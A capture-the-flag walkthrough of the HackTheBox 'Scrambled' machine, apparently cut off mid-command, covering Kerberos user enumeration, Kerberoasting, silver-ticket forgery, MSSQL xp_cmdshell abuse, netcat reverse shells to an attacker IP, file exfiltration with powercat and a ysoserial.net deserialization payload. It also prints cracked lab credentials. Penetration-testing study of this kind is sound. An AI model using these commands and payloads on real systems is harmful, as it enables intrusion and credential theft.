---
title: "HTB - Scrambled"
categories: [box]
date: 2020-07-30
comments: true
image: /images/walkthroughs/hackthebox/scrambled/logo.png
favicon: /images/walkthroughs/hackthebox/scrambled/logo.png
description: HTB - Noter walkthrough
---

# Scrambled

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/banner.png" width="70%"/>
</p>


## Summary

Scrambled is a medium difficulty box were we have a corporation website with plenty information. One key sentence is that the NTLM is deactivated and that the reset password for accounts is the same as the username. We used kerbrute to enumerate and bruteforce the accounts passwords. With a valid account _ksimpson_ we forge a TGT ticket and use it to kerberoast the server to enumerate Service Accounts. We eventually find a mssqlsvc account that we could crack with hashcat. We can log in as the mssqlsvc and run commands on the databse. We extract some credentials and also we are _dbo_ admin user, so we can enable xp_commands to create a revshell. Once inside we can use the found credentials for user _miscsvc_ to run commands as that user. We can create another revshell as that user and get the user flag.

To escalate privileges we used ScrambleClient.exe and ScrambleLib.dll to find a deserialization vulnerability on DeserializeFromBase64 

## Enumeration

First we start with nmap:

```bash
Host is up (0.045s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-17 08:50:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-17T08:53:17+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-17T08:53:17+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-16T04:05:16
|_Not valid after:  2052-09-16T04:05:16
|_ssl-date: 2022-09-17T08:53:17+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-17T08:53:17+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-17T08:53:17+00:00; +1s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
58623/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-17T08:52:42
|_  start_date: N/A
```


And a gobuster on the root domain:

```bash
gobuster dir -u "http://scrm.local" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -x asp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://scrm.local
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp
[+] Timeout:                 10s
===============================================================
2022/09/17 04:54:11 Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 148] [--> http://scrm.local/Images/]
/assets               (Status: 301) [Size: 148] [--> http://scrm.local/assets/]
/images               (Status: 301) [Size: 148] [--> http://scrm.local/images/]
/index.html           (Status: 200) [Size: 2313]
```


We can see a website and some useful information while browsing it:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/1_0_web.png" width="70%"/>
</p>


<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/1_1_info.png" width="70%"/>
</p>


We can add the domain to the /etc/hosts:

```bash
10.10.11.168 scrm.local dc.scrm.local
```

With no access to SMBs with anonymous and no shares enumeration, probably we have to send an email with an attachement with ipconfig command information as displayed in the image:

**support@scramblecorp.com**


<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/1_2_contact.png" width="70%"/>
</p>


This idea fade away since I found no SMTP port to send emails. Enumerating the website we reach this part, where it says that "**If no one is available please leave a message stating your username and we will reset your password to be the same as the username.**". Maybe we can try to enumerate some users and hope to find any with the password being the username... Let's give a try to kerbrute with the xato-net wordlist (overkill, yes it is)


```bash
./kerbrute userenum --dc dc.scrm.local -d scrm.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/17/22 - Ronnie Flathers @ropnop

2022/09/17 11:23:43 >  Using KDC(s):
2022/09/17 11:23:43 >   dc.scrm.local:88

2022/09/17 11:23:52 >  [+] VALID USERNAME:       administrator@scrm.local
2022/09/17 11:24:14 >  [+] VALID USERNAME:       asmith@scrm.local

```

Once I found a relevant username I try to accomodate the wordlist to be as efficient as possible. In this case, we can see that it is a letter plus a surname, so [kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists/) will do the job.


```bash
./kerbrute userenum --dc dc.scrm.local -d scrm.local kerberos_enum_userlists/A-ZSurnames.txt                  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/17/22 - Ronnie Flathers @ropnop

2022/09/17 11:32:21 >  Using KDC(s):
2022/09/17 11:32:21 >   dc.scrm.local:88

2022/09/17 11:32:21 >  [+] VALID USERNAME:       ASMITH@scrm.local
2022/09/17 11:32:41 >  [+] VALID USERNAME:       JHALL@scrm.local
2022/09/17 11:32:43 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2022/09/17 11:32:45 >  [+] VALID USERNAME:       KHICKS@scrm.local
2022/09/17 11:33:01 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2022/09/17 11:33:18 >  Done! Tested 13000 usernames (5 valid) in 57.543 seconds
```

Now our chances to find a reset username are increased. Let's try to log in with any of those with their username as password. I crafted the following list:

kerberos.txt:

```
ASMITH@scrm.local:ASMITH
JHALL@scrm.local:JHALL
KSIMPSON@scrm.local:KSIMPSON
KHICKS@scrm.local:KHICKS
SJENKINS@scrm.local:SJENKINS
asmith@scrm.local:asmith
jhall@scrm.local:jhall
ksimpson@scrm.local:ksimpson
khicks@scrm.local:khicks
sjenkins@scrm.local:sjenkinss
```

And we have **ksimpson@scrm.local:ksimpson** to be valid:

```bash
./kerbrute --dc dc.scrm.local -d scrm.local bruteforce /home/kali/Desktop/HackTheBox/Scrambled/kerberos.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/17/22 - Ronnie Flathers @ropnop

2022/09/17 11:39:46 >  Using KDC(s):
2022/09/17 11:39:46 >   dc.scrm.local:88

2022/09/17 11:39:47 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2022/09/17 11:39:47 >  Done! Tested 10 logins (1 successes) in 0.271 seconds
```


With the username, the password and the premise that we have **NTLM disable in the system** (stated in the warning on first image) we can try _Over Pass the Hash/Pass the Key_ attack. With this attack we will retrieve a TGT (Ticket Granting Ticket) which is usefull to see any if there is a SPN (Service Principal Name) related to that account, if so, we can try to Kerberoast and access that service (this attack will only succed if the hash can be cracked). 

Let's create the TGT with impacket:

```bash
impacket-getTGT scrm.local/ksimpson:ksimpson

  Impacket v0.9.25.dev1+20220422.161948.c7d352b7 - Copyright 2021 SecureAuth Corporation

  [*] Saving ticket in ksimpson.ccache

export KRB5CCNAME=ksimpson.ccache

impacket-psexec scrm.local/ksimpson@10.129.228.10 -k -no-pass

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass
  Impacket v0.9.25.dev1+20220422.161948.c7d352b7 - Copyright 2021 SecureAuth Corporation

  [-] exceptions must derive from BaseException
```

Probably you will get some errors from Get-UsersSPNs. If IP is used instead of the domain name we still having issues. Suddenly, all mates from HTB end up on the [impacket repo](https://github.com/SecureAuthCorp/impacket/issues/1206) talking about the issue. Get yourself the latest version and use the option -dc-host with the hostname. This happens because it only uses the ticket on the KRB5CCNAME if it is a hostname:


```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k -no-pass
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

  ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
  ----------------------------  ------  --------  --------------------------  --------------------------  ----------
  MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2022-09-18 11:45:01.685476             
  MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2022-09-18 11:45:01.685476             


  $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$d2de9ef2ce23edaed540afac17e54eaf$9b7ea02e63e2f927db61bcca78802ff7813a5e3384382e4659b9cfced441e7ed3aa0c35389726c9bb097d8011cbb745f8497630fe59273dec32b10a72e0575c0f56f5f21806613fa12e3adc326ff9daf9e73ed854a5181f078c343eba1456e54c184e9bac25c10f7089df803bba43fd469bad2550d59f33b11f9f269eafc8d02bce01a285d1ec013c97cb2132d224715d8ecb3cf6dfdad4debd3fcaa9db299e5d53cae5f11560f67f0ef0d9b2107c5afff9c3a6b3fd116557dda7a8fb9e44fbb7d615f2a7112f128158119a30d8acf3e5032dd29d304b564248849ab76956c8b94105cdcc9d4ef5cd8fa1f1fa35add7a6098c20a5cf0dd257c2fee31f635626e00cce55487db944ba390076e25e4caff46502341829d7be18126a5d949750c9973a471b2df57643f039a501dabe4d2aaef3b430a9b3a16f2cb45597b3514c6d45839e8c6bbcaaddc358a8392a296da34aff6790864f4b65c81c55ddd0ffe5fd775cb9dd27324288e2cf6565fbadb3e2a4d3d740cee8c9cadd5e87b6a513d3bebf3375e01f9cdcb2116d8f385e8f67b096682832b9cf5ec43620fac52e93e68b98124dcde056338f02ebb17cc44fc76275bd18083e53a73f289511a0fa09b32cdae70112f61be55f61897d3303b8238cfbd55fcc79cbd37c374c9306e67ad016abe54fee5ec2627a83c7b1a088bfab04c15c543fdfa9d7b98a9d5e658a53d7c9d1a92dbd6dc4fdfd08f641e89a1a7d922f80b0cab227a3c7b227f5a78de427973b8d6621ba45267f05c57da043cda5c35b7141a9057d7b2c7caba45e7e5326b897f97c9e844a84ca05851ba5cd164a701d2ac0e8f223f34f40500d60539b1f8d1824c5b73ad0c01dffa306b9ce52de47a1e7407364e3d45f48bc593528d9e22ec1649b0f07306f7f317343b384b0f482ba87e1e561bc6189d37e3361dfbfbf5e3f1af2883a5f700c96afd6b8881d568693e34b6328631924818856c97743acbc4928aa95ad8cc7973d8bc3343e258de60d29930c4a719b30505b6f94b90d56efb423a0b1c43fe0c1317f0991a3b539a28f0480ceddfdd67e85ee39e5841ed83b285d40c33640b239b52e308846bd8d45b284cb8b90c79210cb42098ad1e8fdd86a2e8e5db3d1d1e44ad10cd4b56596b5f59c26d14838c81eabaf526714d9080e177c146e0547619d12da94991bb3c89f6adcd47539974c1de1d3d69e2344137d69604d5661c59e1f7d80c6ea876cb6499ac33465d25084731c0acc20fdff425cfd9e6fafcce4908fa1fd2841ddfeba627e54ed522e6cf89c51e000b049d547bf3377f7aaee1986f6089a8b8523aed4150bf2a8ea9df9bca62b0d7cfa819974daefa888276470c76aebca92c1c335877bfdb8ee2f052270ce505583659da2044cb1d2c181fa77b60d384a4b2b915ff86dbb102dc71e78552cc8916a7
```

Now we can copy the hash and try to crack it. Remember, kerberoasting attacks are useless if company are using strong passwords (they should also be outside any well-known wordlist). Anyway, it can be cracked offline, and a good practice is to enumerate password complexity from the AD, then load custom rules and pray to find it.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/2_0_crack.png" width="70%"/>
</p>

**sqlsvc:Pegasus60**

We have the password. Now let's craft a silver ticket to log into the system with the sqlsvc. We have the following requirements:

- Domain :  The Target domain
    
    **scrm.local**

- Domain SID : The domain Security Identifier

    Get it with impacket's secretsdump or getPAC: **S-1-5-21-2743207045-1827831105-2542523200**

- User ID : The user id. 
  
    Use the **administrator 500**

- SPN : The target service
  
  Obtained with GetUserSPN: **MSSQLSvc/dc1.scrm.local**

- NTHASH : The NTLM hash of the service account. 

    Get it with an [online tool](https://codebeautify.org/ntlm-hash-generator): **B999A16500B87D17EC7F2E2A68778F05**



```bash

impacket-secretsdump scrm.local/ksimpson@dc1.scrm.local -no-pass -k -debug
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

  [+] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket
  [+] Using Kerberos Cache: ksimpson.ccache
  [+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
  [+] AnySPN is True, looking for another suitable SPN
  [+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
  [+] Using TGT from cache
  [+] Trying to connect to KDC at SCRM.LOCAL
  [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
  [*] Using the DRSUAPI method to get NTDS.DIT secrets
  [+] Session resume file will be sessionresume_mJEbUvKl
  [+] Trying to connect to KDC at SCRM.LOCAL
  [+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
  [+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a}


impacket-getPac -targetUser ksimpson scrm.local/ksimpson:ksimpson
  
  Domain SID: S-1-5-21-2743207045-1827831105-2542523200

```

Once we have all requirements, let's use impacket-ticketer to generate the ticket:

```bash
impacket-ticketer -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -user-id 500 Administrator -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/2_1_silver.png" width="70%"/>
</p>


Now we can use the generated ticket, let's log into the SQL service. I'm using impacket-mssqlclient for this task since the ticket is for the _MSSQLSvc_ service:

```bash
export KRB5CCNAME=Administrator.ccache 
impacket-mssqlclient dc1.scrm.local -k -no-pass
```

And we are in:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/3_0_sql.png" width="70%"/>
</p>

Let's use some enumeration commands from the SQL prompt:

```sql
SQL> SELECT system_user;                                                                                                  
----------------------------------
SCRM\administrator

# Enumerate databases and look for one of our interest
SQL> SELECT DB_NAME(1);
----------------------------------
master                                                                                                                             

# Or get all DBs at once
SQL> SELECT concat(DB_NAME(1),':',DB_NAME(2),':',DB_NAME(3),':',DB_NAME(4),':',DB_NAME(5));
----------------------------------
master:tempdb:model:msdb:ScrambleHR


# All at once on mssql. Remembet that master..sysdatabases is equal to master.dbo.sysdatabases
SQL> SELECT name FROM master..sysdatabases;
name   
-----------------------------------
master 
tempdb 
model  
msdb   
ScrambleHR


# Let's get the tables on the database and its ID for making the task easier
SQL> select string_agg(concat(name,':',id), '|') from ScrambleHR..sysobjects where xtype='u'
---------------------------------------------------- 
Employees:581577110|UserImport:597577167|Timesheets:613577224


# Get all columns from the employees table (id 581577110)
SQL> select string_agg(name, '|') from ScrambleHR..syscolumns where id=581577110
----------------------------------------------------
EmployeeID|FirstName|Manager|Role|Surname|Title


# Colujmns from UserImport (kinda interesting with all LDAP user and pass)
SQL> select string_agg(name, '|') from ScrambleHR..syscolumns where id=597577167
-------------------------------------------------------------  
IncludeGroups|LdapDomain|LdapPwd|LdapUser|RefreshInterval


# Focus on that LDAP info. Retrieve all columns
SQL> select * from UserImport;
LdapUser     LdapPwd          LdapDomain  RefreshInterval   IncludeGroups   
--------------------------------------------------------------------   
MiscSvc   ScrambledEggs9900   scrm.local        90               0


# Wow plaintext passwords, I like them. We can try to execute some code with xp_cmdshell
SQL> exec xp_cmdshell 'ping 10.10.14.3';
[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.


# If we are admins, we can reconfigure the execution policies
SQL> select user;
---------------------  
dbo 


# We are admins from the database since we are dbo (default admin on MSSQL)
# Enable execution, run reconfigure (to avoid errors)
SQL> enable_xp_cmdshell
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.


# Run the ping to our attack machine
SQL> exec xp_cmdshell 'ping 10.10.14.3';
---------------------------------------------
Pinging 10.10.14.3 with 32 bytes of data:
Reply from 10.10.14.3: bytes=32 time=43ms TTL=63
Reply from 10.10.14.3: bytes=32 time=43ms TTL=63

```

We got the ping and the execution, so we can create a reverse shell to the machine for better execution process.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/4_0_ping.png" width="70%"/>
</p>

Load netcat into the remote machine:

```bash
# Attack machine
kali@kali:~/Tools/Windows/Tools/netcat-win32-1.12$ python3 -m http.server 5454   
Serving HTTP on 0.0.0.0 port 5454 (http://0.0.0.0:5454/) ...
10.129.228.11 - - [22/Sep/2022 13:43:45] "GET /nc64.exe HTTP/1.1" 200 -
```

```sql
# Remote server
SQL> xp_cmdshell powershell "Invoke-WebRequest -Uri http://10.10.14.3:5454/nc64.exe -Outfile C:\Temp\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

# Create the reverse shell
SQL> xp_cmdshell C:\Temp\nc.exe -e powershell 10.10.14.3 5455
```

Now that we are in I went to the users dir and found several users. The flag was not in the svcsql account but we can see the miscsvc account that we got the credentials from the database:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/4_3_users.png" width="70%"/>
</p>


**MiscSvc:ScrambledEggs9900**


Lets use them to execute commands as that user. On Powershell we can achieve that by creating a Credential object and use it when calling Invoke-Command

```bash
PS C:\Temp> 

$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList MiscSvc, $(ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force) -Verbose

PS C:\Temp>

Invoke-Command -Computer dc1 -Credential $cred -Command { whoami }

scrm\miscsvc
```

Since we have a successful execution as the scrm\miscsvc user, we can do a revshell as that user:

```bash
PS C:\Temp> 

Invoke-Command -Computer dc1 -Credential $cred -Command { C:\Temp\nc.exe -e powershell 10.10.14.3 5456 }

```

And we are in again, now with _miscsvc_ and got the flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/5_0_miscsvc.png" width="70%"/>
</p>

``` ba9c5ff5246df34b949858f8a37ad749 ```


## Privesc

Let's load winpeas on the machine before bloodhound:

```bash
Invoke-WebRequest -Uri "http://10.10.14.3:5454/winPEASany.exe" -outfile winpeas.exe
```

We can see an interesting services running:

```
C:\Program Files\ScrambleCorp\SalesOrdersService\ScrambleServer.exe 4411
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/5_1_privesc.png" width="90%"/>
</p>


Let's search if we can find any exe since we don't have access to _C:\Program Files\ScrambleCorp\SalesOrdersService\\_


```bash
PS C:\Users\miscsvc>
Get-ChildItem C:\ -name -recurse *scramble*

  # Program Files\ScrambleCorp
  # Shares\IT\Apps\Sales Order Client\ScrambleClient.exe
  # Shares\IT\Apps\Sales Order Client\ScrambleLib.dll
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/5_2_exes.png" width="70%"/>
</p>

Let's get those exes for closer inspection in the attack box:

Netcat won't work for that:

```bash
nc.exe 10.10.14.3 5457 < "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe"
```

I usually perform these extraction with evil-winrm or in this case, powercat:

```bash
# Get the powercat script to the machine
Invoke-WebRequest -Uri http://10.10.14.3:5454/powercat.ps1 -Outfile powercat.ps1

# Set attack host to receive the file with the name
nc -lp 5458 -q 1 > ScrambleClient.exe < /dev/null

# Send the file with powercat
powercat -c 10.10.14.3 -p 5458 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe"

# Repeat for the dll
nc -lp 5458 -q 1 > ScrambleClient.dll < /dev/null

powercat -c 10.10.14.3 -p 5458 -i "C:\Shares\IT\Apps\Sales Order Client\ScrambleLib.dll"
```

After obtaining these interesting files, we already know that they have high chances to be written in .NET due to one folder named .NET on the system, which should be holding the developenment tools for .NET, so let's use [dnSpy.exe](https://github.com/dnSpy/dnSpy/releases) to decompile the DLL and the EXE:

We remember the photo of the client UI on the website for some debugging action, but after checking the overall program, we are interested on the DLL since it is the part that is running on the server and the one we want to exploit to escalate privileges. After reviewing the different functions tracing the user input, I reached _UploadOrder_ and _GetOrders_. 


The first one is being used to upload an order. We can see that the client sends a serialized string to the server:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/6_3_uploadorder.png" width="90%"/>
</p>

Then we can see the _GetOrders()_ function, calling to _DeserializeFromBase64(text)_. As far as we are concern, in the client, there is no sanitization on the input, if so, we will bypass it. If the server has no sanitization, we might look for a deserialization vulnerability.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/6_1_deserialize.png" width="70%"/>
</p>

Checking the _DeserializeFromBase64()_, we can see the BinaryFormatter.Deserialize() presumably using the user input without filtering. 


<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/6_2_base64.png" width="70%"/>
</p>

Deserialization process usually have high risks, especially when no filtering is applied to the input. The combination of .NET and BinaryFormatter is always promising due to the vulnerability across all platforms in .NET (more info at [Microsoft's security guide about serialization](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)). For this matter I use [ysosetial.net tool](https://github.com/pwntester/ysoserial.net) very handy, powerful and easy to use executable for Windows. You will have to execute it on your Windows VM and disable Live Protection from Windows Defender since its  payloads are blocked by this feature.

We will choose the WindowsIdentity Gadget, since we want to get the execution into Windows and then the BinaryFormatter format. Then set the payload, I'm using the netcat script I have uploaded recently on the machine to make a reverse shell. Then the output format; we are going to connect with nc on the listening port and send the commands directly to the server in the expected format. To know that, I checked how the client send this request and we can see that the string is splitted in two parts by the character ";", then the first part is comapred with "QUIT", one of the available commands, so the first part is the command and the other is the parameter:

```html

<COMMAND>;<PAYLOAD>

```

Those are the available commands:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/6_4_commands.png" width="70%"/>
</p>

And the "Scramble Request" builder:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/6_5_string.png" width="70%"/>
</p>


Now, with the _ysoserial.exe_ we build the payload:

```bash
PS C:\Users\Ruben\Desktop\Ysoserial\Release> .\ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "C:\Temp\nc.exe -e powershell 10.10.14.3 5458" -o base64
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMndVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRRdU15QTFORFU0SWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L
```

Input it on a new connection to the 4411 port:

```bash
Scrambled$ nc dc1.scrm.local 4411

SCRAMBLECORP_ORDERS_V1.0.3;
